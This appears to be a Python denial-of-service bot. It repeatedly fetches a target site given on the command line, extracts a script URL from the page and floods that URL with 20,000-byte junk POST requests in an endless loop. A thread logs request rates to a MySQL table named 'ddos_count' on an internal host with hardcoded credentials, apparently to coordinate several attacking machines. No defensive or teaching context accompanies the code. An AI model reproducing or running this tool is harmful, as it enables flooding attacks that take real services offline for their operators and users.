import requests
import threading
import MySQLdb
import socket,fcntl,struct
import os
import time
import sys
import re

db = MySQLdb.connect(host="10.0.3.11",user="nova",passwd="nova",db="nova_api")
cursor = db.cursor()

post_content = 'a' * 20000


def get_ip(ifname):
	s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	return socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s',ifname[:15]))[20:24])

def get(url):
	r = requests.get('http://' + sys.argv[1])
	result = r.text
	pattern = re.compile('<script src=\'(.*?)\'>')
	url_list = pattern.findall(result)
	if len(url_list)!=0:
		url = url_list[0]
		requests.post(url, data=post_content)


	
ip = get_ip('eth0')
pid = os.getpid()
count = 0
count_s = 0

sql = "insert into ddos_count(src_ip,pid,count,count_s,dest_ip) values('%s','%s','%s','%s','%s')" % (ip,pid,count,count_s,sys.argv[1])
cursor.execute(sql)
db.commit()

def pac_counter():
	cur = 0
	while True:
		count_s = count - cur
		cur = count
		sql = "update ddos_count set count =%s,count_s =%s where src_ip=%s and pid=%s"
		param = (cur,count_s,ip,pid) 
		cursor.execute(sql,param)
		db.commit()
		time.sleep(1)
	

t = threading.Thread(target=pac_counter, args=())
t.start()

while 1:
#	try:
	get(sys.argv[1])
	count = count + 1
#	except:
	#	pass
